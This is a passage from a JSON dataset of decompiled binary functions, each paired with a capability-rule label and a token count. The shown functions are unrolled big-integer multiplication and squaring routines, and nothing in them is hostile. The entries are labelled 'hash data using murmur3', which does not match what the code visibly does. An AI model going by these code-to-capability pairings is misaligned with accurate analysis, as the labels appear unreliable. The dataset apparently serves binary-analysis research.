uVar4 * 0x10000;\n    if (uVar10 < uVar4 * 0x10000) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar7 = uVar7 + uVar10;\n    if (uVar7 < uVar10) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar4 = var_4h + uVar8 + uVar9;\n    if (uVar4 < uVar9) {\n        arg_10h = arg_10h + 1;\n    }\n    uVar9 = puVar2[9] * puVar3[10];\n    uVar8 = puVar2[8] * puVar3[0xb] + uVar9;\n    iVar5 = puVar2[9] * puVar3[0xb];\n    if (uVar8 < uVar9) {\n        iVar5 = iVar5 + 0x10000;\n    }\n    uVar9 = iVar5 + (uVar8 >> 0x10);\n    uVar10 = puVar2[8] * puVar3[10] + uVar8 * 0x10000;\n    if (uVar10 < uVar8 * 0x10000) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar7 = uVar7 + uVar10;\n    if (uVar7 < uVar10) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar4 = uVar4 + uVar9;\n    if (uVar4 < uVar9) {\n        arg_10h = arg_10h + 1;\n    }\n    uVar9 = puVar2[0xb] * puVar3[8];\n    uVar8 = puVar2[10] * puVar3[9] + uVar9;\n    iVar5 = puVar2[0xb] * puVar3[9];\n    if (uVar8 < uVar9) {\n        iVar5 = iVar5 + 0x10000;\n    }\n    uVar9 = iVar5 + (uVar8 >> 0x10);\n    uVar10 = puVar2[10] * puVar3[8] + uVar8 * 0x10000;\n    if (uVar10 < uVar8 * 0x10000) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar7 = uVar7 + uVar10;\n    if (uVar7 < uVar10) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar4 = uVar4 + uVar9;\n    if (uVar4 < uVar9) {\n        arg_10h = arg_10h + 1;\n    }\n    uVar9 = puVar2[0xd] * puVar3[6];\n    uVar8 = puVar2[0xc] * puVar3[7] + uVar9;\n    iVar5 = puVar2[0xd] * puVar3[7];\n    if (uVar8 < uVar9) {\n        iVar5 = iVar5 + 0x10000;\n    }\n    uVar9 = iVar5 + (uVar8 >> 0x10);\n    uVar10 = puVar2[0xc] * puVar3[6] + uVar8 * 0x10000;\n    if (uVar10 < uVar8 * 0x10000) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar7 = uVar7 + uVar10;\n    if (uVar7 < uVar10) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar4 = uVar4 + uVar9;\n    if (uVar4 < uVar9) {\n        arg_10h = arg_10h + 1;\n    }\n    uVar9 = puVar2[0xf] * puVar3[4];\n    uVar8 = puVar2[0xe] * puVar3[5] + uVar9;\n    iVar5 = puVar2[0xf] * puVar3[5];\n    if (uVar8 < uVar9) {\n        iVar5 = iVar5 + 0x10000;\n    }\n    uVar9 = iVar5 + (uVar8 >> 0x10);\n    uVar10 = puVar2[0xe] * puVar3[4] + uVar8 * 0x10000;\n    if (uVar10 < uVar8 * 0x10000) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar7 = uVar7 + uVar10;\n    if (uVar7 < uVar10) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar4 = uVar4 + uVar9;\n    if (uVar4 < uVar9) {\n        arg_10h = arg_10h + 1;\n    }\n    arg_8h[9] = uVar7;\n    uVar8 = puVar2[0xf] * puVar3[6];\n    uVar7 = puVar2[0xe] * puVar3[7] + uVar8;\n    iVar5 = puVar2[0xf] * puVar3[7];\n    if (uVar7 < uVar8) {\n        iVar5 = iVar5 + 0x10000;\n    }\n    uVar8 = iVar5 + (uVar7 >> 0x10);\n    uVar9 = puVar2[0xe] * puVar3[6] + uVar7 * 0x10000;\n    if (uVar9 < uVar7 * 0x10000) {\n        uVar8 = uVar8 + 1;\n    }\n    uVar4 = uVar4 + uVar9;\n    if (uVar4 < uVar9) {\n        uVar8 = uVar8 + 1;\n    }\n    arg_ch = arg_10h + uVar8 < uVar8;\n    uVar9 = puVar2[0xd] * puVar3[8];\n    uVar7 = puVar2[0xc] * puVar3[9] + uVar9;\n    iVar5 = puVar2[0xd] * puVar3[9];\n    if (uVar7 < uVar9) {\n        iVar5 = iVar5 + 0x10000;\n    }\n    uVar9 = iVar5 + (uVar7 >> 0x10);\n    uVar10 = puVar2[0xc] * puVar3[8] + uVar7 * 0x10000;\n    if (uVar10 < uVar7 * 0x10000) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar4 = uVar4 + uVar10;\n    if (uVar4 < uVar10) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar7 = arg_10h + uVar8 + uVar9;\n    if (uVar7 < uVar9) {\n        arg_ch = arg_ch + 1;\n    }\n    uVar9 = puVar2[0xb] * puVar3[10];\n    uVar8 = puVar2[10] * puVar3[0xb] + uVar9;\n    iVar5 = puVar2[0xb] * puVar3[0xb];\n    if (uVar8 < uVar9) {\n        iVar5 = iVar5 + 0x10000;\n    }\n    uVar9 = iVar5 + (uVar8 >> 0x10);\n    uVar10 = puVar2[10] * puVar3[10] + uVar8 * 0x10000;\n    if (uVar10 < uVar8 * 0x10000) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar4 = uVar4 + uVar10;\n    if (uVar4 < uVar10) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar7 = uVar7 + uVar9;\n    if (uVar7 < uVar9) {\n        arg_ch = arg_ch + 1;\n    }\n    uVar9 = puVar2[9] * puVar3[0xc];\n    uVar8 = puVar2[8] * puVar3[0xd] + uVar9;\n    iVar5 = puVar2[9] * puVar3[0xd];\n    if (uVar8 < uVar9) {\n        iVar5 = iVar5 + 0x10000;\n    }\n    uVar9 = iVar5 + (uVar8 >> 0x10);\n    uVar10 = puVar2[8] * puVar3[0xc] + uVar8 * 0x10000;\n    if (uVar10 < uVar8 * 0x10000) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar4 = uVar4 + uVar10;\n    if (uVar4 < uVar10) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar7 = uVar7 + uVar9;\n    if (uVar7 < uVar9) {\n        arg_ch = arg_ch + 1;\n    }\n    uVar9 = puVar2[7] * puVar3[0xe];\n    uVar8 = puVar2[6] * puVar3[0xf] + uVar9;\n    iVar5 = puVar2[7] * puVar3[0xf];\n    if (uVar8 < uVar9) {\n        iVar5 = iVar5 + 0x10000;\n    }\n    uVar9 = iVar5 + (uVar8 >> 0x10);\n    uVar10 = puVar2[6] * puVar3[0xe] + uVar8 * 0x10000;\n    if (uVar10 < uVar8 * 0x10000) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar4 = uVar4 + uVar10;\n    if (uVar4 < uVar10) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar7 = uVar7 + uVar9;\n    if (uVar7 < uVar9) {\n        arg_ch = arg_ch + 1;\n    }\n    arg_8h[10] = uVar4;\n    uVar8 = puVar2[9] * puVar3[0xe];\n    uVar4 = puVar2[8] * puVar3[0xf] + uVar8;\n    iVar5 = puVar2[9] * puVar3[0xf];\n    if (uVar4 < uVar8) {\n        iVar5 = iVar5 + 0x10000;\n    }\n    uVar8 = iVar5 + (uVar4 >> 0x10);\n    uVar9 = puVar2[8] * puVar3[0xe] + uVar4 * 0x10000;\n    if (uVar9 < uVar4 * 0x10000) {\n        uVar8 = uVar8 + 1;\n    }\n    uVar7 = uVar7 + uVar9;\n    if (uVar7 < uVar9) {\n        uVar8 = uVar8 + 1;\n    }\n    var_4h = arg_ch + uVar8 < uVar8;\n    uVar9 = puVar2[0xb] * puVar3[0xc];\n    uVar4 = puVar2[10] * puVar3[0xd] + uVar9;\n    iVar5 = puVar2[0xb] * puVar3[0xd];\n    if (uVar4 < uVar9) {\n        iVar5 = iVar5 + 0x10000;\n    }\n    uVar9 = iVar5 + (uVar4 >> 0x10);\n    uVar10 = puVar2[10] * puVar3[0xc] + uVar4 * 0x10000;\n    if (uVar10 < uVar4 * 0x10000) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar7 = uVar7 + uVar10;\n    if (uVar7 < uVar10) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar4 = arg_ch + uVar8 + uVar9;\n    if (uVar4 < uVar9) {\n        var_4h = var_4h + 1;\n    }\n    uVar9 = puVar2[0xd] * puVar3[10];\n    uVar8 = puVar2[0xc] * puVar3[0xb] + uVar9;\n    iVar5 = puVar2[0xd] * puVar3[0xb];\n    if (uVar8 < uVar9) {\n        iVar5 = iVar5 + 0x10000;\n    }\n    uVar9 = iVar5 + (uVar8 >> 0x10);\n    uVar10 = puVar2[0xc] * puVar3[10] + uVar8 * 0x10000;\n    if (uVar10 < uVar8 * 0x10000) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar7 = uVar7 + uVar10;\n    if (uVar7 < uVar10) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar4 = uVar4 + uVar9;\n    if (uVar4 < uVar9) {\n        var_4h = var_4h + 1;\n    }\n    uVar9 = puVar2[0xf] * puVar3[8];\n    uVar8 = puVar2[0xe] * puVar3[9] + uVar9;\n    iVar5 = puVar2[0xf] * puVar3[9];\n    if (uVar8 < uVar9) {\n        iVar5 = iVar5 + 0x10000;\n    }\n    uVar9 = iVar5 + (uVar8 >> 0x10);\n    uVar10 = puVar2[0xe] * puVar3[8] + uVar8 * 0x10000;\n    if (uVar10 < uVar8 * 0x10000) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar7 = uVar7 + uVar10;\n    if (uVar7 < uVar10) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar4 = uVar4 + uVar9;\n    if (uVar4 < uVar9) {\n        var_4h = var_4h + 1;\n    }\n    arg_8h[0xb] = uVar7;\n    uVar8 = puVar2[0xf] * puVar3[10];\n    uVar7 = puVar2[0xe] * puVar3[0xb] + uVar8;\n    iVar5 = puVar2[0xf] * puVar3[0xb];\n    if (uVar7 < uVar8) {\n        iVar5 = iVar5 + 0x10000;\n    }\n    uVar8 = iVar5 + (uVar7 >> 0x10);\n    uVar9 = puVar2[0xe] * puVar3[10] + uVar7 * 0x10000;\n    if (uVar9 < uVar7 * 0x10000) {\n        uVar8 = uVar8 + 1;\n    }\n    uVar4 = uVar4 + uVar9;\n    if (uVar4 < uVar9) {\n        uVar8 = uVar8 + 1;\n    }\n    arg_10h = var_4h + uVar8 < uVar8;\n    uVar9 = puVar2[0xd] * puVar3[0xc];\n    uVar7 = puVar2[0xc] * puVar3[0xd] + uVar9;\n    iVar5 = puVar2[0xd] * puVar3[0xd];\n    if (uVar7 < uVar9) {\n        iVar5 = iVar5 + 0x10000;\n    }\n    uVar9 = iVar5 + (uVar7 >> 0x10);\n    uVar10 = puVar2[0xc] * puVar3[0xc] + uVar7 * 0x10000;\n    if (uVar10 < uVar7 * 0x10000) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar4 = uVar4 + uVar10;\n    if (uVar4 < uVar10) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar7 = var_4h + uVar8 + uVar9;\n    if (uVar7 < uVar9) {\n        arg_10h = arg_10h + 1;\n    }\n    uVar9 = puVar2[0xb] * puVar3[0xe];\n    uVar8 = puVar2[10] * puVar3[0xf] + uVar9;\n    iVar5 = puVar2[0xb] * puVar3[0xf];\n    if (uVar8 < uVar9) {\n        iVar5 = iVar5 + 0x10000;\n    }\n    uVar9 = iVar5 + (uVar8 >> 0x10);\n    uVar10 = puVar2[10] * puVar3[0xe] + uVar8 * 0x10000;\n    if (uVar10 < uVar8 * 0x10000) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar4 = uVar4 + uVar10;\n    if (uVar4 < uVar10) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar7 = uVar7 + uVar9;\n    if (uVar7 < uVar9) {\n        arg_10h = arg_10h + 1;\n    }\n    arg_8h[0xc] = uVar4;\n    uVar8 = puVar2[0xd] * puVar3[0xe];\n    uVar4 = puVar2[0xc] * puVar3[0xf] + uVar8;\n    iVar5 = puVar2[0xd] * puVar3[0xf];\n    if (uVar4 < uVar8) {\n        iVar5 = iVar5 + 0x10000;\n    }\n    uVar8 = iVar5 + (uVar4 >> 0x10);\n    uVar9 = puVar2[0xc] * puVar3[0xe] + uVar4 * 0x10000;\n    if (uVar9 < uVar4 * 0x10000) {\n        uVar8 = uVar8 + 1;\n    }\n    uVar7 = uVar7 + uVar9;\n    if (uVar7 < uVar9) {\n        uVar8 = uVar8 + 1;\n    }\n    arg_ch = arg_10h + uVar8 < uVar8;\n    uVar9 = puVar2[0xf] * puVar3[0xc];\n    uVar4 = puVar2[0xe] * puVar3[0xd] + uVar9;\n    iVar5 = puVar2[0xf] * puVar3[0xd];\n    if (uVar4 < uVar9) {\n        iVar5 = iVar5 + 0x10000;\n    }\n    uVar9 = iVar5 + (uVar4 >> 0x10);\n    uVar10 = puVar2[0xe] * puVar3[0xc] + uVar4 * 0x10000;\n    if (uVar10 < uVar4 * 0x10000) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar7 = uVar7 + uVar10;\n    if (uVar7 < uVar10) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar4 = arg_10h + uVar8 + uVar9;\n    if (uVar4 < uVar9) {\n        arg_ch = arg_ch + 1;\n    }\n    arg_8h[0xd] = uVar7;\n    iVar5 = puVar2[0xf] * puVar3[0xf];\n    uVar8 = puVar2[0xf] * puVar3[0xe];\n    uVar7 = puVar2[0xe] * puVar3[0xf] + uVar8;\n    if (uVar7 < uVar8) {\n        iVar5 = iVar5 + 0x10000;\n    }\n    uVar8 = puVar2[0xe] * puVar3[0xe] + uVar7 * 0x10000;\n    iVar5 = iVar5 + (uVar7 >> 0x10);\n    if (uVar8 < uVar7 * 0x10000) {\n        iVar5 = iVar5 + 1;\n    }\n    uVar4 = uVar4 + uVar8;\n    if (uVar4 < uVar8) {\n        iVar5 = iVar5 + 1;\n    }\n    arg_8h[0xe] = uVar4;\n    arg_8h[0xf] = iVar5 + arg_ch;\n    return;\n}\n",
        "token_count": 15609
    },
    "20029663": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.20029663(uint32_t *arg_8h, uint16_t *arg_ch, uint16_t *arg_10h)\n\n{\n    uint16_t uVar1;\n    uint16_t *puVar2;\n    uint16_t *puVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    puVar3 = arg_10h;\n    puVar2 = arg_ch;\n    uVar1 = *arg_ch;\n    uVar7 = arg_ch[1] * *arg_10h;\n    uVar4 = uVar1 * arg_10h[1] + uVar7;\n    arg_ch = arg_ch[1] * arg_10h[1];\n    if (uVar4 < uVar7) {\n        arg_ch = arg_ch + 0x10000;\n    }\n    arg_ch = arg_ch + (uVar4 >> 0x10);\n    uVar7 = uVar1 * *arg_10h + uVar4 * 0x10000;\n    if (uVar7 < uVar4 * 0x10000) {\n        arg_ch = arg_ch + 1;\n    }\n    *arg_8h = uVar7;\n    uVar7 = puVar2[1] * arg_10h[2];\n    iVar5 = puVar2[1] * arg_10h[3];\n    uVar4 = *puVar2 * arg_10h[3] + uVar7;\n    if (uVar4 < uVar7) {\n        iVar5 = iVar5 + 0x10000;\n    }\n    uVar7 = *puVar2 * arg_10h[2] + uVar4 * 0x10000;\n    iVar5 = iVar5 + (uVar4 >> 0x10);\n    if (uVar7 < uVar4 * 0x10000) {\n        iVar5 = iVar5 + 1;\n    }\n    if (arg_ch + uVar7 < uVar7) {\n        iVar5 = iVar5 + 1;\n    }\n    uVar8 = puVar2[3] * *arg_10h;\n    uVar4 = puVar2[2] * arg_10h[1] + uVar8;\n    iVar6 = puVar2[3] * arg_10h[1];\n    if (uVar4 < uVar8) {\n        iVar6 = iVar6 + 0x10000;\n    }\n    uVar8 = iVar6 + (uVar4 >> 0x10);\n    uVar9 = puVar2[2] * *arg_10h + uVar4 * 0x10000;\n    if (uVar9 < uVar4 * 0x10000) {\n        uVar8 = uVar8 + 1;\n    }\n    uVar4 = arg_ch + uVar7 + uVar9;\n    if (uVar4 < uVar9) {\n        uVar8 = uVar8 + 1;\n    }\n    arg_10h = iVar5 + uVar8 < uVar8;\n    arg_8h[1] = uVar4;\n    uVar7 = puVar2[5] * *puVar3;\n    uVar4 = puVar2[4] * puVar3[1] + uVar7;\n    iVar6 = puVar2[5] * puVar3[1];\n    if (uVar4 < uVar7) {\n        iVar6 = iVar6 + 0x10000;\n    }\n    uVar7 = iVar6 + (uVar4 >> 0x10);\n    uVar9 = puVar2[4] * *puVar3 + uVar4 * 0x10000;\n    if (uVar9 < uVar4 * 0x10000) {\n        uVar7 = uVar7 + 1;\n    }\n    uVar4 = iVar5 + uVar8 + uVar9;\n    if (uVar4 < uVar9) {\n        uVar7 = uVar7 + 1;\n    }\n    var_4h = arg_10h + uVar7 < uVar7;\n    uVar9 = puVar2[3] * puVar3[2];\n    uVar8 = puVar2[2] * puVar3[3] + uVar9;\n    iVar5 = puVar2[3] * puVar3[3];\n    if (uVar8 < uVar9) {\n        iVar5 = iVar5 + 0x10000;\n    }\n    uVar9 = iVar5 + (uVar8 >> 0x10);\n    uVar10 = puVar2[2] * puVar3[2] + uVar8 * 0x10000;\n    if (uVar10 < uVar8 * 0x10000) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar4 = uVar4 + uVar10;\n    if (uVar4 < uVar10) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar7 = arg_10h + uVar7 + uVar9;\n    if (uVar7 < uVar9) {\n        var_4h = var_4h + 1;\n    }\n    uVar9 = puVar2[1] * puVar3[4];\n    uVar8 = *puVar2 * puVar3[5] + uVar9;\n    iVar5 = puVar2[1] * puVar3[5];\n    if (uVar8 < uVar9) {\n        iVar5 = iVar5 + 0x10000;\n    }\n    uVar9 = iVar5 + (uVar8 >> 0x10);\n    uVar10 = *puVar2 * puVar3[4] + uVar8 * 0x10000;\n    if (uVar10 < uVar8 * 0x10000) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar4 = uVar4 + uVar10;\n    if (uVar4 < uVar10) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar7 = uVar7 + uVar9;\n    if (uVar7 < uVar9) {\n        var_4h = var_4h + 1;\n    }\n    arg_8h[2] = uVar4;\n    uVar8 = puVar2[1] * puVar3[6];\n    uVar4 = *puVar2 * puVar3[7] + uVar8;\n    iVar5 = puVar2[1] * puVar3[7];\n    if (uVar4 < uVar8) {\n        iVar5 = iVar5 + 0x10000;\n    }\n    uVar8 = iVar5 + (uVar4 >> 0x10);\n    uVar9 = *puVar2 * puVar3[6] + uVar4 * 0x10000;\n    if (uVar9 < uVar4 * 0x10000) {\n        uVar8 = uVar8 + 1;\n    }\n    uVar7 = uVar7 + uVar9;\n    if (uVar7 < uVar9) {\n        uVar8 = uVar8 + 1;\n    }\n    arg_ch = var_4h + uVar8 < uVar8;\n    uVar9 = puVar2[3] * puVar3[4];\n    uVar4 = puVar2[2] * puVar3[5] + uVar9;\n    iVar5 = puVar2[3] * puVar3[5];\n    if (uVar4 < uVar9) {\n        iVar5 = iVar5 + 0x10000;\n    }\n    uVar9 = iVar5 + (uVar4 >> 0x10);\n    uVar10 = puVar2[2] * puVar3[4] + uVar4 * 0x10000;\n    if (uVar10 < uVar4 * 0x10000) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar7 = uVar7 + uVar10;\n    if (uVar7 < uVar10) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar4 = var_4h + uVar8 + uVar9;\n    if (uVar4 < uVar9) {\n        arg_ch = arg_ch + 1;\n    }\n    uVar9 = puVar2[5] * puVar3[2];\n    uVar8 = puVar2[4] * puVar3[3] + uVar9;\n    iVar5 = puVar2[5] * puVar3[3];\n    if (uVar8 < uVar9) {\n        iVar5 = iVar5 + 0x10000;\n    }\n    uVar9 = iVar5 + (uVar8 >> 0x10);\n    uVar10 = puVar2[4] * puVar3[2] + uVar8 * 0x10000;\n    if (uVar10 < uVar8 * 0x10000) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar7 = uVar7 + uVar10;\n    if (uVar7 < uVar10) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar4 = uVar4 + uVar9;\n    if (uVar4 < uVar9) {\n        arg_ch = arg_ch + 1;\n    }\n    uVar9 = puVar2[7] * *puVar3;\n    uVar8 = puVar2[6] * puVar3[1] + uVar9;\n    iVar5 = puVar2[7] * puVar3[1];\n    if (uVar8 < uVar9) {\n        iVar5 = iVar5 + 0x10000;\n    }\n    uVar9 = iVar5 + (uVar8 >> 0x10);\n    uVar10 = puVar2[6] * *puVar3 + uVar8 * 0x10000;\n    if (uVar10 < uVar8 * 0x10000) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar7 = uVar7 + uVar10;\n    if (uVar7 < uVar10) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar4 = uVar4 + uVar9;\n    if (uVar4 < uVar9) {\n        arg_ch = arg_ch + 1;\n    }\n    arg_8h[3] = uVar7;\n    uVar8 = puVar2[7] * puVar3[2];\n    uVar7 = puVar2[6] * puVar3[3] + uVar8;\n    iVar5 = puVar2[7] * puVar3[3];\n    if (uVar7 < uVar8) {\n        iVar5 = iVar5 + 0x10000;\n    }\n    uVar8 = iVar5 + (uVar7 >> 0x10);\n    uVar9 = puVar2[6] * puVar3[2] + uVar7 * 0x10000;\n    if (uVar9 < uVar7 * 0x10000) {\n        uVar8 = uVar8 + 1;\n    }\n    uVar4 = uVar4 + uVar9;\n    if (uVar4 < uVar9) {\n        uVar8 = uVar8 + 1;\n    }\n    arg_10h = arg_ch + uVar8 < uVar8;\n    uVar9 = puVar2[5] * puVar3[4];\n    uVar7 = puVar2[4] * puVar3[5] + uVar9;\n    iVar5 = puVar2[5] * puVar3[5];\n    if (uVar7 < uVar9) {\n        iVar5 = iVar5 + 0x10000;\n    }\n    uVar9 = iVar5 + (uVar7 >> 0x10);\n    uVar10 = puVar2[4] * puVar3[4] + uVar7 * 0x10000;\n    if (uVar10 < uVar7 * 0x10000) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar4 = uVar4 + uVar10;\n    if (uVar4 < uVar10) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar7 = arg_ch + uVar8 + uVar9;\n    if (uVar7 < uVar9) {\n        arg_10h = arg_10h + 1;\n    }\n    uVar9 = puVar2[3] * puVar3[6];\n    uVar8 = puVar2[2] * puVar3[7] + uVar9;\n    iVar5 = puVar2[3] * puVar3[7];\n    if (uVar8 < uVar9) {\n        iVar5 = iVar5 + 0x10000;\n    }\n    uVar9 = iVar5 + (uVar8 >> 0x10);\n    uVar10 = puVar2[2] * puVar3[6] + uVar8 * 0x10000;\n    if (uVar10 < uVar8 * 0x10000) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar4 = uVar4 + uVar10;\n    if (uVar4 < uVar10) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar7 = uVar7 + uVar9;\n    if (uVar7 < uVar9) {\n        arg_10h = arg_10h + 1;\n    }\n    arg_8h[4] = uVar4;\n    uVar8 = puVar2[5] * puVar3[6];\n    uVar4 = puVar2[4] * puVar3[7] + uVar8;\n    iVar5 = puVar2[5] * puVar3[7];\n    if (uVar4 < uVar8) {\n        iVar5 = iVar5 + 0x10000;\n    }\n    uVar8 = iVar5 + (uVar4 >> 0x10);\n    uVar9 = puVar2[4] * puVar3[6] + uVar4 * 0x10000;\n    if (uVar9 < uVar4 * 0x10000) {\n        uVar8 = uVar8 + 1;\n    }\n    uVar7 = uVar7 + uVar9;\n    if (uVar7 < uVar9) {\n        uVar8 = uVar8 + 1;\n    }\n    var_4h = arg_10h + uVar8 < uVar8;\n    uVar9 = puVar2[7] * puVar3[4];\n    uVar4 = puVar2[6] * puVar3[5] + uVar9;\n    iVar5 = puVar2[7] * puVar3[5];\n    if (uVar4 < uVar9) {\n        iVar5 = iVar5 + 0x10000;\n    }\n    uVar9 = iVar5 + (uVar4 >> 0x10);\n    uVar10 = puVar2[6] * puVar3[4] + uVar4 * 0x10000;\n    if (uVar10 < uVar4 * 0x10000) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar7 = uVar7 + uVar10;\n    if (uVar7 < uVar10) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar4 = arg_10h + uVar8 + uVar9;\n    if (uVar4 < uVar9) {\n        var_4h = var_4h + 1;\n    }\n    arg_8h[5] = uVar7;\n    iVar5 = puVar2[7] * puVar3[7];\n    uVar8 = puVar2[7] * puVar3[6];\n    uVar7 = puVar2[6] * puVar3[7] + uVar8;\n    if (uVar7 < uVar8) {\n        iVar5 = iVar5 + 0x10000;\n    }\n    uVar8 = puVar2[6] * puVar3[6] + uVar7 * 0x10000;\n    iVar5 = iVar5 + (uVar7 >> 0x10);\n    if (uVar8 < uVar7 * 0x10000) {\n        iVar5 = iVar5 + 1;\n    }\n    uVar4 = uVar4 + uVar8;\n    if (uVar4 < uVar8) {\n        iVar5 = iVar5 + 1;\n    }\n    arg_8h[6] = uVar4;\n    arg_8h[7] = iVar5 + var_4h;\n    return;\n}\n",
        "token_count": 3865
    },
    "20029c92": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.20029c92(uint32_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uint var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    puVar1 = arg_ch;\n    uVar2 = *arg_ch & 0xffff;\n    uVar6 = *arg_ch >> 0x10;\n    uVar5 = uVar2 * uVar6 * 0x20000;\n    uVar3 = uVar2 * uVar2 + uVar5;\n    iVar7 = uVar6 * uVar6 + (uVar2 * uVar6 >> 0xf);\n    if (uVar3 < uVar5) {\n        iVar7 = iVar7 + 1;\n    }\n    *arg_8h = uVar3;\n    iVar4 = *(arg_ch + 6) * *(arg_ch + 2);\n    uVar3 = *(arg_ch + 6) * *arg_ch;\n    uVar2 = *(arg_ch + 1) * *(arg_ch + 2) + uVar3;\n    if (uVar2 < uVar3) {\n        iVar4 = iVar4 + 0x10000;\n    }\n    uVar5 = *(arg_ch + 1) * *arg_ch + uVar2 * 0x10000;\n    uVar3 = iVar4 + (uVar2 >> 0x10);\n    if (uVar5 < uVar2 * 0x10000) {\n        uVar3 = uVar3 + 1;\n    }\n    arg_ch = (uVar3 & 0x80000000) != 0;\n    iVar4 = uVar3 * 2;\n    if ((uVar5 & 0x80000000) != 0) {\n        iVar4 = iVar4 + 1;\n    }\n    uVar2 = uVar5 * 2 + iVar7;\n    if ((uVar2 < uVar5 * 2) && (iVar4 = iVar4 + 1,  iVar4 == 0)) {\n        arg_ch = arg_ch + 1;\n    }\n    arg_8h[1] = uVar2;\n    uVar2 = puVar1[1] & 0xffff;\n    uVar5 = puVar1[1] >> 0x10;\n    uVar6 = uVar2 * uVar5 * 0x20000;\n    uVar3 = uVar2 * uVar2 + uVar6;\n    uVar2 = uVar5 * uVar5 + (uVar2 * uVar5 >> 0xf);\n    if (uVar3 < uVar6) {\n        uVar2 = uVar2 + 1;\n    }\n    if (iVar4 + uVar3 < uVar3) {\n        uVar2 = uVar2 + 1;\n    }\n    var_4h = arg_ch + uVar2 < uVar2;\n    iVar7 = *(puVar1 + 10) * *(puVar1 + 2);\n    uVar6 = *(puVar1 + 10) * *puVar1;\n    uVar5 = *(puVar1 + 2) * *(puVar1 + 2) + uVar6;\n    if (uVar5 < uVar6) {\n        iVar7 = iVar7 + 0x10000;\n    }\n    uVar8 = *(puVar1 + 2) * *puVar1 + uVar5 * 0x10000;\n    uVar6 = iVar7 + (uVar5 >> 0x10);\n    if (uVar8 < uVar5 * 0x10000) {\n        uVar6 = uVar6 + 1;\n    }\n    if ((uVar6 & 0x80000000) != 0) {\n        var_4h = var_4h + 1;\n    }\n    uVar6 = uVar6 * 2;\n    if ((uVar8 & 0x80000000) != 0) {\n        uVar6 = uVar6 + 1;\n    }\n    uVar3 = iVar4 + uVar3 + uVar8 * 2;\n    if ((uVar3 < uVar8 * 2) && (uVar6 = uVar6 + 1,  uVar6 == 0)) {\n        var_4h = var_4h + 1;\n    }\n    uVar2 = arg_ch + uVar2 + uVar6;\n    if (uVar2 < uVar6) {\n        var_4h = var_4h + 1;\n    }\n    arg_8h[2] = uVar3;\n    iVar7 = *(puVar1 + 0xe) * *(puVar1 + 2);\n    uVar5 = *(puVar1 + 0xe) * *puVar1;\n    uVar3 = *(puVar1 + 3) * *(puVar1 + 2) + uVar5;\n    if (uVar3 < uVar5) {\n        iVar7 = iVar7 + 0x10000;\n    }\n    uVar6 = *(puVar1 + 3) * *puVar1 + uVar3 * 0x10000;\n    uVar5 = iVar7 + (uVar3 >> 0x10);\n    if (uVar6 < uVar3 * 0x10000) {\n        uVar5 = uVar5 + 1;\n    }\n    var_8h = (uVar5 & 0x80000000) != 0;\n    uVar5 = uVar5 * 2;\n    if ((uVar6 & 0x80000000) != 0) {\n        uVar5 = uVar5 + 1;\n    }\n    uVar2 = uVar2 + uVar6 * 2;\n    if ((uVar2 < uVar6 * 2) && (uVar5 = uVar5 + 1,  uVar5 == 0)) {\n        var_8h = var_8h + 1;\n    }\n    if (var_4h + uVar5 < uVar5) {\n        var_8h = var_8h + 1;\n    }\n    iVar7 = *(puVar1 + 10) * *(puVar1 + 6);\n    uVar6 = *(puVar1 + 10) * *(puVar1 + 1);\n    uVar3 = *(puVar1 + 2) * 